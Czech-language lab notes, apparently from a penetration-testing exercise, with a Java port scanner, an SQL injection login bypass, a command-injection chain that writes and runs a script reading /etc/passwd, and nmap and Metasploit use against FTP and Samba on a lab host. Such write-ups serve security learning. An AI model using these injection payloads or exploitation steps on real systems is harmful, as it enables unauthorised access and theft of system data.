# Port scan
- jazyk java
- vytvori to tcp handshake pro kazdy port ktery zvolim
	- resim to pomoci cyklu
- pak to rvu do listu
`import java.net.*;
`import java.util.*;
`public class PortScanner {
`    public static void main(String[] args) {
`        if (args.length < 1) {
`            System.out.println("Usage: java PortScanner <host> [startPort-endPort]");
`            System.out.println("Example: java PortScanner 192.168.1.1 20-100");
`            return;
`        }
`        
`        String host = args[0];
`        int startPort = 1;
`        int endPort = 1024;
`        if (args.length > 1 && args[1].contains("-")) {
`            String[] ports = args[1].split("-");
`            startPort = Integer.parseInt(ports[0]);
`            endPort = Integer.parseInt(ports[1]);
`        }
`        
`        System.out.println("Scanning " + host + " from port " + startPort + " to " + endPort);
`        scanPorts(host, startPort, endPort);
`    }
`    
`    public static void scanPorts(String host, int startPort, int endPort) {
`        List<Integer> openPorts = new ArrayList<>();
`        
`        for (int port = startPort; port <= endPort; port++) {
`            try (Socket socket = new Socket()) {
`                socket.connect(new InetSocketAddress(host, port), 1000);
`                openPorts.add(port);
`                System.out.println("Port " + port + " is OPEN");
`            } catch (Exception e) {
`                System.out.println("Port " + port + " is closed");
`            }
`        }
`        
`        System.out.println("\nScan complete!");
`        System.out.println("Open ports: " + openPorts);
`    }
`}

# Utok na web
- sql injection
	- ![[Pasted image 20260104155221.png]]
	- nejdrive jsem se snazil ziskat chybovou hlasku, takze celej ten kus sql se kterym budu pracovat
	- podle nej vidim ze neni nijak zpracovany input od uzivatele
	- takze kdyz puziju:
	  name: admin
	  password: ' or 'a'='a
	- ![[Pasted image 20260104155459.png]]
- pousteni skriptu
	- snazim se pomoci prikazu ktery to pousti a bere input jako argument vytvorit vlastni skript a pustit jej
	- tudiz jsem pouzil nasledujici input:
	  - ; touch neco.sh; echo "#! /bin/bash" >> neco.sh; echo "uname -a" >> neco.sh; echo "whoami" >> neco.sh; echo "ls /etc" >> neco.sh; echo "cat /etc/passwd" >> neco.sh
	  - ; chmod +x neco.sh
	  - ; ./neco.sh
	- ![[Pasted image 20260104160514.png]]
	- ![[Pasted image 20260104160722.png]]
	- ![[Pasted image 20260104160806.png]]

# Utok na operacni system
- pocitam s tim ze jiz znam ip adresu na kterou utocim
- proskenuju otevrene porty
- nmap 10.0.0.2
- ![[Pasted image 20260104161956.png]]
- ted by to chtelo i verze, pouziji prepinac -sV
- ![[Pasted image 20260104162314.png]]
- vidim ze je otevreny prot ftp (file transport protokol), takze zkusim ten
- pustim msfconsole
	- pomoci search najdu vsechny pouzitelne exploity
	- ![[Pasted image 20260104163143.png]]
	- vidim presnou verzi jako ma obet tak zkusim pouzit tu
	- prepnu se do exploitu a nastavim ho
		- ![[Pasted image 20260104163347.png]]
	- pak jen dam run
	- ![[Pasted image 20260104163630.png]]
- ted si vyberu dalsi, zkusim samba
- ![[Pasted image 20260104165810.png]]
- ![[Pasted image 20260104165736.png]]